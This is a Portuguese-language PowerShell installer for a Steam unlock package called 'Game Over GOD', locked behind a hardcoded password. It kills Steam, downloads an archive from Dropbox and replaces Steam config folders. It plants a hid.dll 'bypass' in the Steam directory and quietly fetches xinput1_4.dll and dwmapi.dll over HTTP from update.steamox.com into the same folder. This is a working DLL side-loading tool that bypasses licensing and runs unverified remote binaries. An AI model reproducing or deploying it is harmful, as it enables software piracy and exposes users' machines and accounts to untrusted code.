# ===== AMBIENTE E CODIFICACAO =====
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Clear-Host

# Ativar suporte a cores ANSI
if ($host.Name -eq 'ConsoleHost') {
    $mode = Get-ItemProperty -Path "HKCU:\Console" -Name "VirtualTerminalLevel" -ErrorAction SilentlyContinue
    if (-not $mode) {
        New-ItemProperty -Path "HKCU:\Console" -Name "VirtualTerminalLevel" -PropertyType DWord -Value 1 -Force | Out-Null
    }
}

# ===== CONFIGURACOES GERAIS =====
$localFile = "$env:TEMP\GameOverGod.rar"
$extractPath = "$env:TEMP\GO_God_Final"
$urlDoRar = "https://www.dropbox.com/scl/fi/8iaguxb8v9nizl999m9we/GameOverGod.rar?rlkey=0f3okk06rx1hh86ay9bb087hq&st=cikja2zq&dl=1"

# Detectar Steam
$steamReg = Get-ItemProperty "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
if (-not $steamReg.SteamExe) { 
    Write-Host "ERRO: Steam nao encontrada no sistema." -ForegroundColor Red
    pause; exit 
}
$steamExe = $steamReg.SteamExe
$steamDir = [System.IO.Path]::GetDirectoryName($steamExe)
$configDir = Join-Path $steamDir "config"

# ===== INTERFACE VISUAL =====
function Show-Header {
    Clear-Host
    Write-Host "  ____    _    __  __  _____    ___  __      _____  ____  " -ForegroundColor Magenta
    Write-Host " / ___|  / \  |  \/  || ____|  / _ \ \ \    / /| ____||  _ \ " -ForegroundColor Cyan
    Write-Host "| |  _  / _ \ | |\/| ||  _|    | | | | \ \  / / |  _|  | |_) |" -ForegroundColor Magenta
    Write-Host "| |_| |/ ___ \| |  | || |___  | |_| |  \ V /  | |___ |  _ < " -ForegroundColor Cyan
    Write-Host " \____/_/   \_\_|  |_||_____|  \___/    \_/    |_____||_| \_\" -ForegroundColor Magenta
    Write-Host " ------------------ GESTAO DE ELITE V4.4 (GOD) -------------- " -ForegroundColor White
    Write-Host " CEO: Marcos - Game Over " -ForegroundColor Gray
    Write-Host ""
}

# ===== FUNCOES DE PROCESSO =====
function Stop-Steam {
    Write-Host "Fechando processos da Steam..." -ForegroundColor Yellow
    Get-Process steam, steamwebhelper -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2
}

function Executar-Instalacao {
    param ($Modo)
    Show-Header
    
    Write-Host "Sincronizando Plano GOD com servidor Game Over..." -ForegroundColor Cyan
    if (Test-Path $localFile) { Remove-Item $localFile -Force }
    try {
        Invoke-WebRequest -Uri $urlDoRar -OutFile $localFile -Headers @{"Cache-Control"="no-cache"} -ErrorAction Stop
        Write-Host "Download concluido!" -ForegroundColor Green
    } catch {
        Write-Host "ERRO: Falha ao baixar pacote GOD." -ForegroundColor Red
        Pause; return
    }

    Stop-Steam
    
    if (Test-Path $extractPath) { Remove-Item $extractPath -Recurse -Force }
    New-Item -ItemType Directory -Path $extractPath | Out-Null

    Write-Host "Instalando componentes GOD..." -ForegroundColor Cyan
    if (Test-Path "C:\Program Files\WinRAR\WinRAR.exe") {
        & "C:\Program Files\WinRAR\WinRAR.exe" x -ibck -y $localFile $extractPath
    } elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
        & "C:\Program Files\7-Zip\7z.exe" x $localFile "-o$extractPath" -y
    } else {
        Expand-Archive -Path $localFile -DestinationPath $extractPath -Force -ErrorAction SilentlyContinue
    }

    # Busca inteligente pela pasta config e arquivo hid.dll
    $foundConfig = Get-ChildItem -Path $extractPath -Recurse -Directory -Filter "config" | Select-Object -First 1
    if ($foundConfig) {
        $limpar = @("$configDir\depotcache", "$configDir\stplug-in")
        foreach ($l in $limpar) { if (Test-Path $l) { Remove-Item $l -Recurse -Force -ErrorAction SilentlyContinue } }
        Copy-Item -Path "$($foundConfig.FullName)\*" -Destination "$configDir" -Recurse -Force
        Write-Host "-> Modulos GOD aplicados." -ForegroundColor Gray
    }

    $foundHid = Get-ChildItem -Path $extractPath -Recurse -File -Filter "hid.dll" | Select-Object -First 1
    if ($foundHid) {
        Copy-Item -Path $foundHid.FullName -Destination "$steamDir" -Force
        Write-Host "-> Bypass GOD injetado." -ForegroundColor Gray
    }

    # DLLs Adicionais de Sistema
    $dlls = @{ "xinput1_4.dll" = "http://update.steamox.com/update"; "dwmapi.dll" = "http://update.steamox.com/dwmapi" }
    foreach ($name in $dlls.Keys) {
        try { Invoke-WebRequest -Uri $dlls[$name] -OutFile (Join-Path $steamDir $name) -ErrorAction SilentlyContinue } catch {}
    }

    if ($Modo -eq "Full") {
        Write-Host "Limpando arquivos temporarios da Steam..." -ForegroundColor Yellow
        $folders = @("cache", "temp", "tmp")
        foreach ($f in $folders) { 
            $p = Join-Path $steamDir $f
            if (Test-Path $p) { Remove-Item "$p\*" -Recurse -Force -ErrorAction SilentlyContinue }
        }
    }

    Write-Host "`nSUCESSO: Plano Game Over GOD Instalado!" -ForegroundColor Green
    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $localFile -Force -ErrorAction SilentlyContinue
}

# ===== SISTEMA DE SENHA =====
Show-Header
$tentativas = 0
$senhaCorreta = "1234"

while ($tentativas -lt 3) {
    $inputSenha = Read-Host " DIGITE A SENHA GOD "
    if ($inputSenha -eq $senhaCorreta) {
        Write-Host "Acesso autorizado!" -ForegroundColor Green
        Start-Sleep -Milliseconds 500
        break
    } else {
        $tentativas++
        Write-Host "Senha incorreta! ($tentativas/3)" -ForegroundColor Red
        if ($tentativas -eq 3) { exit }
    }
}

# ===== MENU PRINCIPAL =====
$continuar = $true
while ($continuar) {
    Show-Header
    Write-Host " 1. Instalar/Atualizar Sistema GOD"
    Write-Host " 2. Instalacao Completa (Full Clean GOD)"
    Write-Host " 3. Remover Sistema (Limpeza Total)"
    Write-Host " 4. Sair"
    Write-Host " ------------------------------------------------------------ "
    
    $opt = Read-Host "Escolha uma opcao"

    switch ($opt) {
        "1" { Executar-Instalacao "Normal"; $continuar = $false }
        "2" { Executar-Instalacao "Full"; $continuar = $false }
        "3" { 
            Stop-Steam
            $files = @("Hid.dll", "xinput1_4.dll", "dwmapi.dll")
            foreach ($f in $files) { $p = Join-Path $steamDir $f; if (Test-Path $p) { Remove-Item $p -Force } }
            Write-Host "Sistema removido com sucesso!" -ForegroundColor Yellow
            Start-Sleep -Seconds 2
            $continuar = $false
        }
        "4" { exit }
        Default { Write-Host "Opcao invalida!" -ForegroundColor Red; Start-Sleep -Seconds 1 }
    }
}

Write-Host "`nFinalizando... Iniciando Steam." -ForegroundColor Cyan
Start-Process $steamExe
Start-Sleep -Seconds 2
